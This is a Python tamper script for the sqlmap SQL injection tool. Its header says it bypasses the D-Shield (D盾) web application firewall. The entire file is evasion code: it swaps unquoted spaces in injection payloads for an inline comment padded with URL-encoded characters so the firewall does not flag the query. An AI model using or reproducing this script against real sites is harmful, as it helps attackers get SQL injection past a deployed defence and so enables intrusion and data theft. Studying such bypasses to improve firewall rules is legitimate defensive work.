# coding=UTF-8
# Desc: sqlmap_bypass_D盾_tamper

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
            BYPASS Ddun
    """
    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False
        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/*DJSAWW%2B%26Lt%3B%2B*/"
                    continue
            elif payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote
            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/*DJSAWW%2B%26Lt%3B%2B*/"
                continue
            retVal += payload[i]
    return retVal